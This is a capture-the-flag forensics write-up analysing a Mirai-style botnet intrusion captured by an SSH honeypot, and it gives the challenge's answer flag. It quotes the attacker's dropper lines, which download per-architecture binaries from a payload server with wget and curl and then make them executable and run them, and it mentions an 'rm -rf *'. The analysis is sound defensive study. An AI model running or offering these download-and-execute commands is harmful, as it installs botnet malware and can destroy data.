# Phantom — Write-up

- **Category:** DFIR
- **Author:** 0xL4!TH
- **Flag:** `RxR{admin_198.51.100.7_robben_10}`

## Flag format

`RxR{password_ip_filename_count}` — four facts about a Mirai-style botnet
infection captured by a Cowrie SSH honeypot (`edge-gw-03`).

## Files

- `cowrie.json` — honeypot session log.
- `capture.pcap` — the matching network capture.

> ⚠️ The attacker commands are real (addresses swapped). Don't paste them into a
> shell: the downloads would fail but the `rm -rf *` would still run.

## 1. Login password

```json
{"eventid":"cowrie.login.success", "username":"root", "password":"admin"}
```

→ **admin**

## 2. Payload-server IP

Every download points at the same host:

```
http://198.51.100.7/phantom.sh
http://198.51.100.7/bins/phantom.x86
...
```

→ **198.51.100.7**

## 3. Name the payload runs under

Pull the dropper out of the pcap:

```bash
tshark -r capture.pcap --export-objects http,out
cat out/phantom.sh
```

Each stanza downloads an arch build, copies it to a fixed name, and executes
**that** name:

```sh
wget http://198.51.100.7/bins/phantom.x86; curl -O http://198.51.100.7/bins/phantom.x86
cat phantom.x86 > robben ; chmod +x * ; ./robben Payload
```

→ it runs as **robben** (also why the sister challenge is named "Robben's").

## 4. How many per-CPU builds

Count the distinct architectures the dropper tries:

```bash
grep -oP 'phantom\.\w+' out/phantom.sh | sort -u
# arm4 arm5 arm6 arm7 m68k mips mpsl ppc sh4 x86
```

`x86, mips, mpsl, arm4, arm5, arm6, arm7, ppc, m68k, sh4` → **10** builds.

## Flag

```
RxR{admin_198.51.100.7_robben_10}
```
